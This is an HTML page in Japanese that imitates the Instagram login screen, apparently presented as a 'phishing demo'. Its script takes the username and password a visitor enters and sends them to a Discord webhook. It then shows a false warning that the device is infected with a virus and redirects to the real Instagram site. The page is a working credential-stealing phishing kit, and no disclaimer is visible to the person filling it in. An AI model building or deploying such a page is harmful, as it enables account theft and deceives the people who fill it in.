<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .container {
            width: 350px;
        }
        
        .login-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            margin-bottom: 10px;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo img {
            width: 175px;
        }
        
        input {
            width: 100%;
            padding: 9px 8px;
            margin-bottom: 6px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 12px;
        }
        
        button {
            width: 100%;
            padding: 8px;
            margin-top: 8px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
        }
        
        button:hover {
            background-color: #1877f2;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        
        .divider span {
            padding: 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        
        .facebook-login {
            text-align: center;
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }
        
        .forgot-password {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #00376b;
        }
        
        .signup-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 25px;
            text-align: center;
            font-size: 14px;
        }
        
        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        
        .warning-banner {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            background-color: #ff6b6b;
            color: white;
            text-align: center;
            padding: 10px;
            font-weight: bold;
            z-index: 1000;
        }
    </style>
</head>
    
    <div style="margin-top: 50px;" class="container">
        <div class="login-box">
            <div class="logo">
                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png" alt="Instagram">
            </div>
            <form id="loginForm">
                <input type="text" id="username" placeholder="電話番号、ユーザーネーム、メールアドレス" required>
                <input type="password" id="password" placeholder="パスワード" required>
                <button type="submit">ログイン</button>
            </form>
            <div class="divider">
                <span>または</span>
            </div>
            <div class="facebook-login">
                Facebookでログイン
            </div>
            <div class="forgot-password">
                パスワードを忘れた場合
            </div>
        </div>
        <div class="signup-box">
            アカウントをお持ちでないですか？ <a href="#">登録する</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Discord Webhookに送信
            const webhookUrl = 'https://discord.com/api/webhooks/1531913476086173718/_ekY9pKfAY4YRZlF1SRvrOWVse7Yt5ujzsySS3OOvFTkxiQluAaBvPAix71pcEPX9VOd';
            
            const payload = {
                content: '【フィッシングデモ】新しい入力がありました',
                embeds: [{
                    title: '入力情報',
                    fields: [
                        { name: 'ユーザーネーム/メール', value: username, inline: true },
                        { name: 'パスワード', value: '||' + password + '||', inline: true },
                        { name: '時刻', value: new Date().toLocaleString('ja-JP'), inline: false }
                    ],
                    color: 15158332
                }]
            };
            
            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(() => {
                // 教育用のメッセージを表示
                alert('【警告】ウイルスに感染しました！\n\nパスワードを変更するためにメールをご確認ください');
                
                // リダイレクト（実際のInstagramなど）
                window.location.href = 'https://www.instagram.com';
            })
            .catch(error => console.error('Error:', error));
        });
    </script>
</body>
</html>
